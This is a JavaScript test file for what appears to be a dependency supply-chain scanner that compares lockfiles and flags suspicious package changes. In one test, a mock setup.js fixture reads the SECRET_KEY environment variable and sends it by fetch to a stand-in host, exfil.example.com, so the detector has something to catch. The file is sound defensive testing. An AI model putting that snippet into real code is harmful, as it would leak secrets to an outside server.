import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { resolve } from 'node:path';
import { loadProjectInputs } from '../src/input.mjs';
import { compareLockfiles } from '../src/lockfile-diff.mjs';
import { collectEvidence } from '../src/collector.mjs';

const BENIGN_BASE = resolve('fixtures/benign/base');
const BENIGN_HEAD = resolve('fixtures/benign/head');
const SUSPICIOUS_BASE = resolve('fixtures/suspicious/base');
const SUSPICIOUS_HEAD = resolve('fixtures/suspicious/head');

describe('Static Evidence Collector Tests', () => {
  it('collects evidence for suspicious fixture with simulated script analysis', async () => {
    const base = await loadProjectInputs(SUSPICIOUS_BASE, 'base');
    const head = await loadProjectInputs(SUSPICIOUS_HEAD, 'head');
    const diff = compareLockfiles(base.lockfile, head.lockfile);

    // Provide mock script files for mock-telemetry-reporter
    const fixtureFiles = {
      'mock-telemetry-reporter': [
        {
          path: 'setup.js',
          content: `
            const token = process.env.SECRET_KEY;
            fetch("http://exfil.example.com?data=" + token);
          `
        }
      ]
    };

    const evidence = await collectEvidence(diff, 'test-subject-digest-0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef', {
      mode: 'fixture',
      fixtureFiles,
      popularPackages: ['picocolors', 'express']
    });

    assert.equal(evidence.schemaVersion, '1.0');
    assert.equal(evidence.mode, 'fixture');
    assert.ok(evidence.observations.length > 0);

    const ruleIds = evidence.observations.map((o) => o.ruleId);
    assert.ok(ruleIds.includes('LIFECYCLE_SCRIPT_ADDED'));
    assert.ok(ruleIds.includes('ENVIRONMENT_ACCESS'));
    assert.ok(ruleIds.includes('NETWORK_OPERATION'));
  });

  it('collects evidence for live public benign package (Step 8 requirement)', async () => {
    // Test diff containing real public package: ms 2.1.2 -> 2.1.3
    const base = await loadProjectInputs(BENIGN_BASE, 'base');
    const head = await loadProjectInputs(BENIGN_HEAD, 'head');
    const diff = compareLockfiles(base.lockfile, head.lockfile);

    const evidence = await collectEvidence(diff, 'benign-subject-digest-0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef', {
      mode: 'live',
      popularPackages: ['lodash', 'express']
    });

    assert.equal(evidence.mode, 'live');
    assert.equal(evidence.collectionStatus, 'complete');

    // Confirm real source record was fetched from registry.npmjs.org
    const liveSource = evidence.sources.find((s) => s.sourceType === 'live');
    assert.ok(liveSource);
    assert.match(liveSource.pathOrUrl, /https:\/\/registry\.npmjs\.org\//);

    // Confirm ms package was scanned
    const msEntry = evidence.packages.find((p) => p.name === 'ms');
    assert.ok(msEntry);
    assert.equal(msEntry.changeType, 'changed');
  });

  it('marks unsupported dependency sources explicitly in evidence unknowns and observations', async () => {
    const fakeDiff = {
      packages: [
        {
          name: 'git-repo-pkg',
          location: 'node_modules/git-repo-pkg',
          changeType: 'added',
          isDirect: true,
          unsupported: true,
          unsupportedReason: 'GIT_DEPENDENCY_UNSUPPORTED'
        }
      ]
    };

    const evidence = await collectEvidence(fakeDiff, 'git-subject-digest-0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef', {
      mode: 'fixture'
    });

    assert.equal(evidence.collectionStatus, 'incomplete');
    assert.ok(evidence.incompleteReasons.some((r) => r.includes('GIT_DEPENDENCY_UNSUPPORTED')));
    const obs = evidence.observations.find((o) => o.ruleId === 'UNSUPPORTED_OR_INCOMPLETE');
    assert.ok(obs);
  });
});
